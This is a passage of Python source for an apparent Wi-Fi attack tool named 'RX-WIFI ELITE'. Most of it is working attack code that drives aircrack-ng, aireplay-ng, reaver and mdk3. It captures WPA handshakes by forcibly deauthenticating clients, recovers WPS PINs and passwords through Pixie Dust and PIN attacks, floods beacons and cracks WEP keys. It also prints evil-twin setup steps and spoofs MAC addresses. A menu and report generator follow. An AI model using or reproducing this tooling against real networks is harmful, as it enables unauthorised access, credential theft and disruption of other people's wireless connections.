                               essid: str = None) -> Optional[Path]:
        """Capture WPA handshake"""
        EliteGraphics.show_loading("EXECUTING HANDSHAKE ATTACK")
        
        output_base = self.results_dir / f"handshake_{target_bssid.replace(':', '')}_{int(time.time())}"
        
        # Start capture
        capture_cmd = [
            'airodump-ng',
            '-c', str(channel),
            '--bssid', target_bssid,
            '-w', str(output_base),
            '--output-format', 'pcap,csv',
            self.interface
        ]
        
        if essid:
            capture_cmd.extend(['--essid', essid])
        
        try:
            capture_proc = subprocess.Popen(capture_cmd,
                                          stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL)
            
            time.sleep(8)  # Stabilize
            
            # Intelligent deauth
            self._intelligent_deauth(target_bssid)
            
            # Monitor for handshake
            handshake_file = self._monitor_handshake(output_base, capture_proc, target_bssid)
            
            # Cleanup
            capture_proc.terminate()
            capture_proc.wait(timeout=5)
            
            if handshake_file:
                print(f"{EliteGraphics.color('✓', 46)} HANDSHAKE CAPTURED: {handshake_file}")
                return handshake_file
            else:
                print(f"{EliteGraphics.color('✗', 196)} HANDSHAKE ATTACK FAILED")
                return None
                
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} HANDSHAKE ERROR: {e}")
            return None
    
    def _intelligent_deauth(self, target_bssid: str):
        """Intelligent deauthentication strategy"""
        # Try to get connected clients first
        temp_file = tempfile.mktemp(prefix='clients_')
        
        cmd = [
            'airodump-ng',
            '--bssid', target_bssid,
            '--write', temp_file,
            '--output-format', 'csv',
            self.interface
        ]
        
        proc = subprocess.Popen(cmd,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
        
        time.sleep(5)
        proc.terminate()
        
        clients = []
        csv_file = Path(f"{temp_file}-01.csv")
        
        if csv_file.exists():
            try:
                with open(csv_file, 'r') as f:
                    content = f.read()
                
                lines = content.split('\n')
                in_clients = False
                
                for line in lines:
                    if 'Station MAC' in line:
                        in_clients = True
                        continue
                    
                    if in_clients and line.strip():
                        parts = line.split(',')
                        if len(parts) > 0:
                            client_mac = parts[0].strip()
                            if client_mac and len(client_mac) == 17:
                                clients.append(client_mac)
                
                csv_file.unlink()
                
            except:
                pass
        
        # Execute deauth based on found clients
        if clients:
            print(f"{EliteGraphics.color('→', 51)} FOUND {len(clients)} CLIENTS")
            
            for client in clients[:3]:  # Target first 3 clients
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '7',
                    '-a', target_bssid,
                    '-c', client,
                    self.interface
                ]
                
                subprocess.run(deauth_cmd,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             timeout=10)
                time.sleep(2)
        else:
            # Broadcast deauth
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '15',
                '-a', target_bssid,
                self.interface
            ]
            
            subprocess.run(deauth_cmd,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         timeout=15)
    
    def _monitor_handshake(self, output_base: Path, capture_proc,
                          target_bssid: str) -> Optional[Path]:
        """Monitor for handshake capture"""
        timeout = 120  # 2 minutes
        start_time = time.time()
        cap_file = Path(f"{output_base}-01.cap")
        
        while time.time() - start_time < timeout:
            if capture_proc.poll() is not None:
                break
            
            if cap_file.exists():
                # Check for handshake
                if self._check_handshake(cap_file):
                    return cap_file
            
            # Periodic deauth every 15 seconds
            if int(time.time() - start_time) % 15 == 0:
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '5',
                    '-a', target_bssid,
                    self.interface
                ]
                
                subprocess.run(deauth_cmd,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             timeout=5)
            
            time.sleep(1)
        
        return None
    
    def _check_handshake(self, cap_file: Path) -> bool:
        """Check if cap file contains handshake"""
        try:
            result = subprocess.run(['aircrack-ng', str(cap_file)],
                                  capture_output=True, text=True, timeout=10)
            return 'handshake' in result.stdout.lower()
        except:
            return False
    
    def execute_wps_attack(self, target_bssid: str, channel: int,
                          attack_type: str = "pixie") -> Optional[Dict]:
        """Execute WPS attack"""
        EliteGraphics.show_loading("EXECUTING WPS ATTACK")
        
        # Check WPS status first
        if not self._check_wps(target_bssid, channel):
            print(f"{EliteGraphics.color('✗', 196)} WPS NOT ENABLED")
            return None
        
        if attack_type == "pixie":
            return self._execute_pixie_dust(target_bssid, channel)
        else:
            return self._execute_wps_pin(target_bssid, channel)
    
    def _check_wps(self, target_bssid: str, channel: int) -> bool:
        """Check if WPS is enabled"""
        try:
            wash_cmd = [
                'wash',
                '-i', self.interface,
                '-c', str(channel),
                '-a'
            ]
            
            result = subprocess.run(wash_cmd,
                                  capture_output=True, text=True, timeout=30)
            
            return target_bssid.lower() in result.stdout.lower()
            
        except:
            return False
    
    def _execute_pixie_dust(self, target_bssid: str, channel: int) -> Optional[Dict]:
        """Execute Pixie Dust attack"""
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-vv',
                '-K', '1'  # Pixie dust
            ]
            
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     text=True,
                                     bufsize=1)
            
            result = {
                'success': False,
                'pin': None,
                'password': None,
                'output': []
            }
            
            # Monitor for 5 minutes
            start_time = time.time()
            while time.time() - start_time < 300:
                if process.poll() is not None:
                    break
                
                line = process.stdout.readline()
                if line:
                    result['output'].append(line.strip())
                    print(f"{EliteGraphics.color('→', 51)} {line.strip()}")
                    
                    if 'WPS pin:' in line:
                        result['pin'] = line.split(':')[1].strip()
                        result['success'] = True
                    elif 'WPA PSK:' in line:
                        result['password'] = line.split(':')[1].strip()
                        result['success'] = True
            
            process.terminate()
            process.wait(timeout=5)
            
            if result['success']:
                print(f"{EliteGraphics.color('✓', 46)} WPS PIXIE DUST SUCCESSFUL")
                return result
            else:
                print(f"{EliteGraphics.color('✗', 196)} WPS PIXIE DUST FAILED")
                return None
                
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} PIXIE DUST ERROR: {e}")
            return None
    
    def _execute_wps_pin(self, target_bssid: str, channel: int) -> Optional[Dict]:
        """Execute WPS PIN attack"""
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-vv',
                '-N',  # No nack
                '-f'   # Fixed
            ]
            
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     text=True,
                                     bufsize=1)
            
            result = {
                'success': False,
                'pin': None,
                'password': None,
                'output': []
            }
            
            # Monitor for 10 minutes
            start_time = time.time()
            while time.time() - start_time < 600:
                if process.poll() is not None:
                    break
                
                line = process.stdout.readline()
                if line:
                    result['output'].append(line.strip())
                    
                    if 'WPS pin:' in line:
                        result['pin'] = line.split(':')[1].strip()
                        result['success'] = True
                    elif 'WPA PSK:' in line:
                        result['password'] = line.split(':')[1].strip()
                        result['success'] = True
            
            process.terminate()
            process.wait(timeout=5)
            
            if result['success']:
                print(f"{EliteGraphics.color('✓', 46)} WPS PIN ATTACK SUCCESSFUL")
                return result
            else:
                print(f"{EliteGraphics.color('✗', 196)} WPS PIN ATTACK FAILED")
                return None
                
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} WPS PIN ERROR: {e}")
            return None
    
    def execute_deauth_attack(self, target_bssid: str, client: str = None,
                            count: int = 0, interval: float = 0.1):
        """Execute deauthentication attack"""
        EliteGraphics.show_loading("EXECUTING DEAUTH ATTACK")
        
        if count == 0:
            print(f"{EliteGraphics.color('⚠', 214)} CONTINUOUS ATTACK - CTRL+C TO STOP")
        
        try:
            if client:
                cmd = f"aireplay-ng --deauth {count} -a {target_bssid} -c {client} {self.interface}"
            else:
                cmd = f"aireplay-ng --deauth {count} -a {target_bssid} {self.interface}"
            
            process = subprocess.Popen(cmd, shell=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True)
            
            self.active_attacks['deauth'] = process
            
            # Wait for completion or interrupt
            try:
                if count > 0:
                    process.wait(timeout=count * interval + 10)
                else:
                    while True:
                        time.sleep(1)
            except KeyboardInterrupt:
                print(f"{EliteGraphics.color('⚠', 214)} DEAUTH INTERRUPTED")
            except:
                pass
            
            # Cleanup
            process.terminate()
            process.wait(timeout=3)
            
            print(f"{EliteGraphics.color('✓', 46)} DEAUTH ATTACK COMPLETED")
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} DEAUTH ERROR: {e}")
    
    def execute_beacon_flood(self, ssids: List[str] = None, count: int = 1000,
                           channel: int = 1):
        """Execute beacon flood attack"""
        EliteGraphics.show_loading("EXECUTING BEACON FLOOD")
        
        if not ssids:
            ssids = [
                "FREE_WIFI", "Airport_WiFi", "Hotel_Guest", "Starbucks_Free",
                "McDonalds_Free", "Google_Free", "FBI_Surveillance", "CIA_Security",
                "NSA_Monitor", "Public_WiFi", "Guest_Access", "Conference_WiFi"
            ]
        
        try:
            # Use mdk3 for beacon flood if available
            mdk3_result = subprocess.run(['which', 'mdk3'],
                                       capture_output=True, text=True)
            
            if mdk3_result.returncode == 0:
                # Create SSID list file
                ssid_file = self.results_dir / "beacon_ssids.txt"
                with open(ssid_file, 'w') as f:
                    for ssid in ssids:
                        f.write(f"{ssid}\n")
                
                # Execute mdk3
                cmd = f"mdk3 {self.interface} b -c {channel} -f {ssid_file} -s {count}"
                subprocess.run(cmd, shell=True, timeout=count * 0.1 + 30)
                
            else:
                # Fallback to aireplay-ng
                for i in range(count):
                    ssid = random.choice(ssids)
                    if random.random() > 0.7:
                        ssid = f"{ssid}_{random.randint(1, 999)}"
                    
                    # Create beacon with aireplay-ng
                    cmd = f"aireplay-ng --fakeauth 1 -e '{ssid}' -a {random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)} {self.interface}"
                    subprocess.run(cmd, shell=True,
                                 stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
                    
                    if i % 100 == 0:
                        EliteGraphics.show_progress(i, count,
                                                  prefix='BEACON FLOOD',
                                                  suffix=f'Sent: {i}/{count}')
            
            print(f"{EliteGraphics.color('✓', 46)} BEACON FLOOD COMPLETED")
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} BEACON FLOOD ERROR: {e}")
    
    def execute_evil_twin(self, target_essid: str, target_bssid: str,
                         channel: int, portal: bool = False):
        """Execute Evil Twin attack"""
        EliteGraphics.show_loading("EXECUTING EVIL TWIN ATTACK")
        
        print(f"{EliteGraphics.color('⚠', 214)} EVIL TWIN ATTACK - ADVANCED FEATURE")
        print(f"{EliteGraphics.color('→', 51)} This attack requires additional setup")
        
        # This is a complex attack that requires multiple components
        # For now, we'll show the setup instructions
        instructions = """
EVIL TWIN SETUP INSTRUCTIONS:
1. Create configuration files:
   - /etc/hostapd/hostapd.conf
   - /etc/dnsmasq.conf
   
2. Start services:
   sudo systemctl stop NetworkManager
   sudo hostapd /etc/hostapd/hostapd.conf
   sudo dnsmasq -C /etc/dnsmasq.conf
   
3. Configure IP forwarding:
   sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
   sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
   
4. Start captive portal (optional)
        """
        
        print(instructions)
    
    def execute_wep_attack(self, target_bssid: str, channel: int):
        """Execute WEP attack"""
        EliteGraphics.show_loading("EXECUTING WEP ATTACK")
        
        output_base = self.results_dir / f"wep_{target_bssid.replace(':', '')}_{int(time.time())}"
        
        try:
            # Start capture
            capture_cmd = [
                'airodump-ng',
                '-c', str(channel),
                '--bssid', target_bssid,
                '-w', str(output_base),
                '--output-format', 'pcap,csv',
                self.interface
            ]
            
            capture_proc = subprocess.Popen(capture_cmd,
                                          stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL)
            
            time.sleep(5)
            
            # ARP replay attack
            print(f"{EliteGraphics.color('→', 51)} STARTING ARP REPLAY ATTACK")
            
            replay_cmd = [
                'aireplay-ng',
                '--arpreplay',
                '-b', target_bssid,
                '-h', 'FF:FF:FF:FF:FF:FF',  # Fake MAC
                self.interface
            ]
            
            replay_proc = subprocess.Popen(replay_cmd,
                                         stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
            
            # Monitor IVs
            timeout = 300  # 5 minutes
            start_time = time.time()
            ivs_collected = 0
            
            while time.time() - start_time < timeout:
                csv_file = Path(f"{output_base}-01.csv")
                if csv_file.exists():
                    try:
                        with open(csv_file, 'r') as f:
                            content = f.read()
                        
                        # Parse IVs
                        lines = content.split('\n')
                        for line in lines:
                            if target_bssid in line:
                                parts = line.split(',')
                                if len(parts) > 10 and parts[10].isdigit():
                                    ivs = int(parts[10])
                                    if ivs > ivs_collected:
                                        ivs_collected = ivs
                                        print(f"{EliteGraphics.color('→', 51)} IVs COLLECTED: {ivs}")
                                        
                                        # Try to crack with enough IVs
                                        if ivs >= 10000:
                                            cap_file = Path(f"{output_base}-01.cap")
                                            if cap_file.exists():
                                                print(f"{EliteGraphics.color('→', 51)} ATTEMPTING CRACK WITH {ivs} IVs")
                                                
                                                crack_cmd = [
                                                    'aircrack-ng',
                                                    '-0',  # Show key only
                                                    str(cap_file)
                                                ]
                                                
                                                result = subprocess.run(crack_cmd,
                                                                      capture_output=True,
                                                                      text=True,
                                                                      timeout=30)
                                                
                                                if 'KEY FOUND' in result.stdout:
                                                    print(f"{EliteGraphics.color('✓', 46)} WEP KEY CRACKED!")
                                                    print(result.stdout)
                                                    break
                    except:
                        pass
                
                time.sleep(5)
            
            # Cleanup
            capture_proc.terminate()
            replay_proc.terminate()
            capture_proc.wait(timeout=5)
            replay_proc.wait(timeout=5)
            
            print(f"{EliteGraphics.color('✓', 46)} WEP ATTACK COMPLETED")
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} WEP ATTACK ERROR: {e}")
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        EliteGraphics.show_loading("STOPPING ALL ATTACKS")
        
        for name, process in list(self.active_attacks.items()):
            try:
                process.terminate()
                process.wait(timeout=3)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        self.active_attacks.clear()
        
        # Kill any remaining attack processes
        kill_commands = [
            "pkill -9 airodump-ng",
            "pkill -9 aireplay-ng",
            "pkill -9 reaver",
            "pkill -9 bully",
            "pkill -9 hcxdumptool",
            "pkill -9 mdk3",
            "pkill -9 mdk4"
        ]
        
        for cmd in kill_commands:
            subprocess.run(cmd, shell=True,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        
        print(f"{EliteGraphics.color('✓', 46)} ALL ATTACKS STOPPED")

# ============================================================================
# ELITE REPORT GENERATOR
# ============================================================================

class EliteReportGenerator:
    """Advanced report generation system"""
    
    def __init__(self, output_dir: str = "reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_scan_report(self, networks: Dict[str, WiFiNetwork],
                           clients: Dict[str, WiFiClient]) -> Path:
        """Generate comprehensive scan report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = self.output_dir / f"scan_report_{timestamp}.json"
        
        report = {
            'metadata': {
                'generated': datetime.now().isoformat(),
                'total_networks': len(networks),
                'total_clients': len(clients),
                'tool': 'RX-WIFI ELITE v4.0'
            },
            'networks': {},
            'clients': {},
            'statistics': self._calculate_statistics(networks, clients),
            'recommendations': self._generate_recommendations(networks)
        }
        
        # Add networks
        for bssid, network in networks.items():
            report['networks'][bssid] = {
                'essid': network.essid,
                'channel': network.channel,
                'signal': network.signal,
                'encryption': network.encryption,
                'security_score': network.security_score,
                'vulnerable': network.is_vulnerable,
                'recommended_attack': network.recommended_attack,
                'clients_count': len(network.clients),
                'wps_enabled': network.wps,
                'wps_locked': network.wps_locked
            }
        
        # Add clients
        for mac, client in clients.items():
            report['clients'][mac] = {
                'bssid': client.bssid,
                'signal': client.signal,
                'packets': client.packets,
                'vendor': client.vendor_from_mac,
                'probed_essids': client.probed_essids,
                'associated': client.is_associated
            }
        
        # Write report
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Also generate HTML report
        html_file = self._generate_html_report(report, timestamp)
        
        print(f"{EliteGraphics.color('✓', 46)} REPORT GENERATED: {report_file}")
        print(f"{EliteGraphics.color('✓', 46)} HTML REPORT: {html_file}")
        
        return report_file
    
    def _calculate_statistics(self, networks: Dict[str, WiFiNetwork],
                            clients: Dict[str, WiFiClient]) -> Dict:
        """Calculate detailed statistics"""
        stats = {
            'encryption': {},
            'channels': {},
            'security': {'high': 0, 'medium': 0, 'low': 0},
            'vulnerabilities': {
                'wep': 0,
                'wpa_wps': 0,
                'wps_unlocked': 0,
                'open': 0
            }
        }
        
        for network in networks.values():
            # Encryption distribution
            enc = network.encryption.split()[0] if network.encryption else 'UNKNOWN'
            stats['encryption'][enc] = stats['encryption'].get(enc, 0) + 1
            
            # Channel distribution
            stats['channels'][network.channel] = stats['channels'].get(network.channel, 0) + 1
            
            # Security levels
            if network.security_score >= 80:
                stats['security']['high'] += 1
            elif network.security_score >= 50:
                stats['security']['medium'] += 1
            else:
                stats['security']['low'] += 1
            
            # Vulnerabilities
            if 'WEP' in network.encryption.upper():
                stats['vulnerabilities']['wep'] += 1
            if 'WPA' in network.encryption.upper() and network.wps:
                stats['vulnerabilities']['wpa_wps'] += 1
            if network.wps and not network.wps_locked:
                stats['vulnerabilities']['wps_unlocked'] += 1
            if 'OPEN' in network.encryption.upper():
                stats['vulnerabilities']['open'] += 1
        
        return stats
    
    def _generate_recommendations(self, networks: Dict[str, WiFiNetwork]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        vulnerable_count = sum(1 for n in networks.values() if n.is_vulnerable)
        
        if vulnerable_count > 0:
            recommendations.append(f"Found {vulnerable_count} vulnerable networks")
        
        for network in networks.values():
            if network.security_score < 50:
                recommendations.append(
                    f"Network '{network.essid}' ({network.bssid}) has weak security: {network.encryption}"
                )
            if network.wps and not network.wps_locked:
                recommendations.append(
                    f"Network '{network.essid}' has WPS enabled and unlocked"
                )
        
        if not recommendations:
            recommendations.append("All networks appear to have good security configurations")
        
        return recommendations
    
    def _generate_html_report(self, report: Dict, timestamp: str) -> Path:
        """Generate HTML version of report"""
        html_file = self.output_dir / f"scan_report_{timestamp}.html"
        
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>RX-WIFI ELITE Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #0f0f23; color: #00ff00; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ text-align: center; padding: 20px; border-bottom: 2px solid #00ff00; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0; }}
        .card {{ background: #1a1a2e; padding: 20px; border-radius: 10px; border: 1px solid #00ff00; }}
        .network-table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        .network-table th, .network-table td {{ padding: 10px; text-align: left; border: 1px solid #00ff00; }}
        .network-table th {{ background: #1a1a2e; }}
        .vulnerable {{ color: #ff0000; font-weight: bold; }}
        .secure {{ color: #00ff00; }}
        .warning {{ color: #ffff00; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>RX-WIFI ELITE Scan Report</h1>
            <p>Generated: {report['metadata']['generated']}</p>
            <p>Tool: {report['metadata']['tool']}</p>
        </div>
        
        <div class="stats">
            <div class="card">
                <h3>Network Statistics</h3>
                <p>Total Networks: {report['metadata']['total_networks']}</p>
                <p>Total Clients: {report['metadata']['total_clients']}</p>
            </div>
            <div class="card">
                <h3>Security Levels</h3>
                <p>High Security: {report['statistics']['security']['high']}</p>
                <p>Medium Security: {report['statistics']['security']['medium']}</p>
                <p>Low Security: {report['statistics']['security']['low']}</p>
            </div>
        </div>
        
        <h2>Networks Found</h2>
        <table class="network-table">
            <tr>
                <th>BSSID</th>
                <th>ESSID</th>
                <th>Channel</th>
                <th>Signal</th>
                <th>Encryption</th>
                <th>Security</th>
                <th>Vulnerable</th>
            </tr>
            {"".join([
                f'<tr><td>{bssid}</td><td>{data["essid"]}</td><td>{data["channel"]}</td>'
                f'<td>{data["signal"]}</td><td>{data["encryption"]}</td>'
                f'<td class="{"secure" if data["security_score"] >= 80 else "warning" if data["security_score"] >= 50 else "vulnerable"}">{data["security_score"]}</td>'
                f'<td class="{"vulnerable" if data["vulnerable"] else "secure"}">{"YES" if data["vulnerable"] else "NO"}</td></tr>'
                for bssid, data in report['networks'].items()
            ])}
        </table>
        
        <h2>Recommendations</h2>
        <div class="card">
            <ul>
                {"".join([f'<li>{rec}</li>' for rec in report['recommendations']])}
            </ul>
        </div>
    </div>
</body>
</html>
        """
        
        with open(html_file, 'w') as f:
            f.write(html_template)
        
        return html_file

# ============================================================================
# ELITE COMMAND CENTER
# ============================================================================

class EliteCommandCenter:
    """Main command center with advanced interface"""
    
    def __init__(self, debug: bool = False):
        self.debug = debug
        self.interface_manager = None
        self.scanner = None
        self.attack_engine = None
        self.report_generator = EliteReportGenerator()
        self.running = True
        
        # Signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Stats
        self.start_time = time.time()
        self.commands_executed = 0
    
    def _signal_handler(self, sig, frame):
        """Handle termination signals"""
        print(f"\n{EliteGraphics.color('⚠', 214)} SHUTDOWN SIGNAL RECEIVED")
        self.cleanup()
        sys.exit(0)
    
    def initialize(self) -> bool:
        """Initialize the system"""
        EliteGraphics.show_banner()
        EliteGraphics.show_rx_team()
        time.sleep(1)
        
        # Check root
        if not SystemValidator.check_root():
            print(f"{EliteGraphics.color('✗', 196)} ROOT PRIVILEGES REQUIRED")
            print(f"{EliteGraphics.color('→', 51)} Run: sudo python3 rx_wifi_elite.py")
            return False
        
        # Check dependencies
        deps = SystemValidator.check_dependencies()
        missing = [tool for tool, avail in deps.items() if not avail]
        
        if missing:
            print(f"{EliteGraphics.color('⚠', 214)} MISSING DEPENDENCIES: {missing}")
            print(f"{EliteGraphics.color('→', 51)} Install with: sudo apt install aircrack-ng hcxtools reaver bully mdk4")
        
        # Check WiFi card
        if not SystemValidator.check_wifi_card():
            print(f"{EliteGraphics.color('⚠', 214)} NO WIRELESS CARD DETECTED")
        
        return True
    
    def main_menu(self):
        """Main menu loop"""
        while self.running:
            EliteGraphics.clear()
            EliteGraphics.show_banner()
            
            uptime = time.time() - self.start_time
            hours, rem = divmod(uptime, 3600)
            minutes, seconds = divmod(rem, 60)
            
            print(f"\n{EliteGraphics.color('═' * 70, 45)}")
            print(f"{EliteGraphics.color('SYSTEM UPTIME:', 51)} {int(hours)}h {int(minutes)}m {int(seconds)}s")
            print(f"{EliteGraphics.color('COMMANDS EXECUTED:', 51)} {self.commands_executed}")
            print(f"{EliteGraphics.color('═' * 70, 45)}")
            
            EliteGraphics.show_menu_title("MAIN MENU")
            print(f"{EliteGraphics.color('1', 226)}. INTERFACE MANAGEMENT")
            print(f"{EliteGraphics.color('2', 226)}. NETWORK DISCOVERY")
            print(f"{EliteGraphics.color('3', 226)}. ADVANCED ATTACK SUITE")
            print(f"{EliteGraphics.color('4', 226)}. GENERATE REPORTS")
            print(f"{EliteGraphics.color('5', 226)}. SYSTEM UTILITIES")
            print(f"{EliteGraphics.color('0', 226)}. EXIT")
            print(f"{EliteGraphics.color('═' * 70, 45)}")
            
            try:
                choice = input(f"\n{EliteGraphics.color('[?] SELECT OPTION:', 51)} ").strip()
                self.commands_executed += 1
                
                if choice == "1":
                    self.interface_menu()
                elif choice == "2":
                    self.discovery_menu()
                elif choice == "3":
                    self.attack_menu()
                elif choice == "4":
                    self.reports_menu()
                elif choice == "5":
                    self.utilities_menu()
                elif choice == "0":
                    self.cleanup()
                    self.running = False
                else:
                    print(f"{EliteGraphics.color('✗', 196)} INVALID OPTION")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{EliteGraphics.color('⚠', 214)} INTERRUPTED")
                time.sleep(1)
            except Exception as e:
                print(f"{EliteGraphics.color('✗', 196)} ERROR: {e}")
                time.sleep(2)
    
    def interface_menu(self):
        """Interface management menu"""
        if not self.interface_manager:
            self.interface_manager = EliteInterfaceManager()
        
        while True:
            EliteGraphics.clear()
            EliteGraphics.show_menu_title("INTERFACE MANAGEMENT")
            
            print(f"{EliteGraphics.color('1', 226)}. DISCOVER INTERFACES")
            print(f"{EliteGraphics.color('2', 226)}. ENABLE MONITOR MODE")
            print(f"{EliteGraphics.color('3', 226)}. CHANGE MAC ADDRESS")
            print(f"{EliteGraphics.color('4', 226)}. SET CHANNEL")
            print(f"{EliteGraphics.color('5', 226)}. CHANNEL HOPPING")
            print(f"{EliteGraphics.color('6', 226)}. RESTORE NETWORK")
            print(f"{EliteGraphics.color('7', 226)}. BACK")
            
            try:
                choice = input(f"\n{EliteGraphics.color('[?] SELECT:', 51)} ").strip()
                
                if choice == "1":
                    interfaces = self.interface_manager.discover_all()
                    if interfaces:
                        print(f"\n{EliteGraphics.color('✓', 46)} INTERFACES FOUND:")
                        for i, iface in enumerate(interfaces, 1):
                            caps = self.interface_manager.capabilities.get(iface, {})
                            print(f"  {i}. {iface} - Monitor: {caps.get('monitor', False)}")
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} NO INTERFACES FOUND")
                    input("\nPress Enter to continue...")
                    
                elif choice == "2":
                    if not self.interface_manager.interfaces:
                        print(f"{EliteGraphics.color('✗', 196)} DISCOVER INTERFACES FIRST")
                        time.sleep(1)
                        continue
                    
                    print(f"\n{EliteGraphics.color('→', 51)} INTERFACES: {self.interface_manager.interfaces}")
                    iface = input("SELECT INTERFACE: ").strip()
                    
                    if iface in self.interface_manager.interfaces:
                        monitor_iface = self.interface_manager.enable_monitor_mode(iface)
                        if monitor_iface:
                            self.scanner = EliteNetworkScanner(monitor_iface)
                            self.attack_engine = EliteAttackEngine(monitor_iface)
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} INVALID INTERFACE")
                    time.sleep(2)
                    
                elif choice == "3":
                    if not self.interface_manager.monitor_interface:
                        print(f"{EliteGraphics.color('✗', 196)} ENABLE MONITOR MODE FIRST")
                        time.sleep(1)
                        continue
                    
                    print(f"\n{EliteGraphics.color('1', 226)}. RANDOM MAC")
                    print(f"{EliteGraphics.color('2', 226)}. CUSTOM MAC")
                    
                    mac_choice = input("SELECT: ").strip()
                    
                    if mac_choice == "1":
                        success = self.interface_manager.change_mac(
                            self.interface_manager.monitor_interface
                        )
                        if success:
                            print(f"{EliteGraphics.color('✓', 46)} MAC CHANGED")
                        else:
                            print(f"{EliteGraphics.color('✗', 196)} MAC CHANGE FAILED")
                    elif mac_choice == "2":
                        custom_mac = input("ENTER MAC (XX:XX:XX:XX:XX:XX): ").strip()
                        if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', custom_mac):
                            success = self.interface_manager.change_mac(
                                self.interface_manager.monitor_interface,
                                custom_mac
                            )
                            if success:
                                print(f"{EliteGraphics.color('✓', 46)} MAC CHANGED")
                            else:
                                print(f"{EliteGraphics.color('✗', 196)} MAC CHANGE FAILED")
                        else:
                            print(f"{EliteGraphics.color('✗', 196)} INVALID MAC FORMAT")
                    time.sleep(1)
                    
                elif choice == "4":
                    if self.interface_manager.monitor_interface:
                        channel = input("ENTER CHANNEL: ").strip()
                        if channel.isdigit():
                            success = self.interface_manager.set_channel(
                                self.interface_manager.monitor_interface,
                                int(channel)
                            )
                            if success:
                                print(f"{EliteGraphics.color('✓', 46)} CHANNEL SET TO {channel}")
                            else:
                                print(f"{EliteGraphics.color('✗', 196)} FAILED TO SET CHANNEL")
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} NO MONITOR INTERFACE")
                    time.sleep(1)
                    
                elif choice == "5":
                    if self.interface_manager.monitor_interface:
                        channels = input("ENTER CHANNELS (comma separated): ").strip()
                        if channels:
                            try:
                                channel_list = [int(c.strip()) for c in channels.split(',')]
                                self.interface_manager.set_channel_hop(
                                    self.interface_manager.monitor_interface,
                                    channel_list
                                )
                                print(f"{EliteGraphics.color('✓', 46)} CHANNEL HOPPING STARTED")
                                input("Press Enter to stop...")
                                self.interface_manager.stop_channel_hop()
                            except ValueError:
                                print(f"{EliteGraphics.color('✗', 196)} INVALID CHANNELS")
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} NO MONITOR INTERFACE")
                    time.sleep(1)
                    
                elif choice == "6":
                    self.interface_manager.restore_all()
                    time.sleep(2)
                    
                elif choice == "7":
                    break
                    
                else:
                    print(f"{EliteGraphics.color('✗', 196)} INVALID CHOICE")
                    
            except KeyboardInterrupt:
                print(f"\n{EliteGraphics.color('⚠', 214)} INTERRUPTED")
                break
    
    def discovery_menu(self):
        """Network discovery menu"""
        if not self.scanner:
            print(f"{EliteGraphics.color('✗', 196)} ENABLE MONITOR MODE FIRST")
            time.sleep(2)
            return
        
        while True:
            EliteGraphics.clear()
            EliteGraphics.show_menu_title("NETWORK DISCOVERY")
            
            print(f"{EliteGraphics.color('1', 226)}. QUICK SCAN (15s)")
            print(f"{EliteGraphics.color('2', 226)}. DEEP SCAN (60s)")
            print(f"{EliteGraphics.color('3', 226)}. TARGETED SCAN")
            print(f"{EliteGraphics.color('4', 226)}. DISPLAY RESULTS")
            print(f"{EliteGraphics.color('5', 226)}. BACK")
            
            try:
                choice = input(f"\n{EliteGraphics.color('[?] SELECT:', 51)} ").strip()
                
                if choice == "1":
                    self.scanner.scan(duration=15)
                    input("\nPress Enter to continue...")
                    
                elif choice == "2":
                    self.scanner.scan(duration=60)
